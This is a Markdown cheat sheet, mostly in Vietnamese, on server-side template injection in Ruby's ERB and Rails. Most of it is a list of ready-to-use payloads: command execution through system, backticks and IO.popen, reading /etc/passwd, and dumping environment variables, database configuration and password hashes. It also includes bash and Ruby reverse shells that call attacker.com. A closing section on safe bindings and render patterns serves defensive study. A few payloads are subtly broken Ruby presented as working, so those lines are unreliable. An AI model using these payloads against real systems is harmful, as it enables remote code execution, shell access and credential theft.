# 17 - ERB (Ruby)

## Tổng Quan

**ERB (Embedded Ruby)** là template engine mặc định cho Ruby on Rails. Được sử dụng rộng rãi trong:

- Ruby on Rails
- Sinatra
- Jekyll
- Standalone Ruby projects

## Cú Pháp Cơ Bản

```erb
<% # Ruby code (no output) %>
<%= variable %>         <!-- Output variable -->
<%= user.name %>        <!-- Call method -->
<%= items[0] %>
<% if condition %>
  <%= "true" %>
<% end %>
<% items.each do |item| %>
  <%= item %>
<% end %>
```

## Biểu Thức Ruby

```erb
<%= 7 * 7 %>            → 49
<%= "hello" + " " + "world" %>  → hello world
<%= [1,2,3].length %>   → 3
```

## SSTI Detection

### Basic Math

```erb
<%= 7*7 %>              → 49
```

### Object/Method Access

```erb
<%= self %>             → main:Object
<%= self.class %>       → Object
```

### Error Trigger

```erb
<%= undefined_var %>    → Error (undefined local variable)
```

## RCE Payloads

### System Commands

```erb
<%= system('whoami') %>
<%= `id` %>                     <!-- Backtick execution -->
<%= %x(whoami) %>              <!-- %x notation -->
```

### Require and Execute

```erb
<%
require 'socket'
require 'open3'
system('id')
%>
```

### Using IO.popen

```erb
<%= IO.popen('id').readlines() %>
<%= IO.popen('whoami') {|f| f.read } %>
```

### Using pty/fork (Advanced)

```erb
<%
require 'pty'
PTY.spawn('bash') do |r, w, pid|
  # Interactive shell
end
%>
```

## File Operations

### Reading Files

```erb
<%= File.read('/etc/passwd') %>
<%= File.open('/etc/passwd') {|f| f.read } %>
```

### Directory Listing

```erb
<%= Dir.entries('/') %>
<%= Dir.glob('/etc/*') %>
```

## Rails-Specific Exploitation

### Accessing Rails Config

```erb
<%= Rails.env %>
<%= Rails.root %>
<%= Rails.configuration.database_configuration %>
```

### Environment Variables

```erb
<%= ENV['DATABASE_URL'] %>
<%= ENV %>                      <!-- All env vars -->
```

### Controller/Request Access

Jika template memiliki akses ke request object:

```erb
<%= request.env['PATH_INFO'] %>
<%= request.headers %>
<%= params %>           <!-- All parameters -->
```

### Database Query (Dangerous!)

```erb
<%
# If database connection accessible
User.pluck(:email, :password_hash)
%>
```

## Reverse Shell

### Bash via system()

```erb
<%= system("bash -i >& /dev/tcp/attacker.com/4444 0>&1") %>
```

### Ruby Socket Reverse Shell

```erb
<%
require 'socket'
s = TCPSocket.new('attacker.com', 4444)
while true
  cmd = s.gets
  result = `#{cmd}`
  s.puts result
end
%>
```

### Interactive Shell (PTY)

```erb
<%
require 'pty'
PTY.spawn("bash") do |stdout, stdin, pid|
  # Spawn interactive bash
end
%>
```

## String Formatting untuk RCE

### Using String Interpolation

```erb
<%= "whoami".system %>
<%= "id"."chars".map(&:ord) %>  <!-- Obfuscated -->
```

### Using send Method

```erb
<%= "system".to_sym %>
<%= Object.const_get("Kernel").send(:system, "id") %>
```

## Object Introspection

### Ruby Introspection

```erb
<!-- Access methods -->
<%= self.methods %>
<%= String.methods %>
<%= Kernel.methods %>

<!-- Access constants -->
<%= Object.constants %>
<%= Object.const_get('Kernel') %>
```

### Finding Dangerous Methods

```erb
<%
methods = String.methods
dangerous = methods.select { |m| m.to_s.include?('exec') || m.to_s.include?('system') }
%>
<%= dangerous %>
```

## Blind SSTI in ERB

### Time-Based

```erb
<%
if 7*7 == 49
  sleep(5)
end
%>
```

### Write to File

```erb
<%
File.open('/tmp/pwned.txt', 'w') { |f| f.write('success') }
%>
```

### DNS Lookup

```erb
<%
require 'socket'
Socket.gethostbyname('attacker.burpcollab.net')
%>
```

## Detection Payloads

```erb
# Math
<%= 7*7 %>              → 49

# Backtick execution (unique to ERB/Ruby)
<%= `whoami` %>         → username output OR command not found error

# Object reference
<%= self %>             → main:Object

# Class reference
<%= self.class %>       → Object
```

## ERB Security Configuration

```ruby
# Safe configuration
require 'erb'

# Create template from string with limited context
template_string = "<%= name %>"
template = ERB.new(template_string)

# Use binding with limited variables
safe_binding = binding
# Add only safe variables to binding
safe_binding.local_variable_set(:name, user.name)

output = template.result(safe_binding)  # SAFE

# Or use secure_binding approach
def safe_template_render(template_string, variables = {})
  erb = ERB.new(template_string)
  # Create isolated binding
  safe_context = Object.new
  variables.each do |k, v|
    safe_context.define_singleton_method(k) { v }
  end
  erb.result(safe_context.instance_eval { binding })
end
```

### Rails Template Security

```ruby
# In Rails controller

# ✓ SAFE - Pass data as context
render :template => "email", :locals => { :user => current_user }

# ❌ UNSAFE - Concatenate user input into template
template_name = "template_#{params[:type]}"
render :template => template_name

# ❌ UNSAFE - Render user template
render :text => params[:template_content]

# ✓ SAFE - Render with safe template
render :template => "safe_templates/#{sanitize_template_name(params[:type])}"
```

## Rails Specific Vulnerabilities

### Dynamic Render

```ruby
# Vulnerable in older Rails
render :action => params[:view]

# Can lead to template injection
# Attacker: ?view=../../../tmp/malicious
```

### Template Fragment Caching

```erb
<!-- If fragment names are user-controlled -->
<% cache("user_#{params[:id]}_profile") %>
  <%= render :partial => "profile" %>
<% end %>
```

## Tài Liệu Liên Quan

- [04-exploitation-techniques.md](04-exploitation-techniques.md) - Kỹ thuật khai thác
- [09-jinja2-python.md](09-jinja2-python.md) - Jinja2
- [11-mako-python.md](11-mako-python.md) - Mako
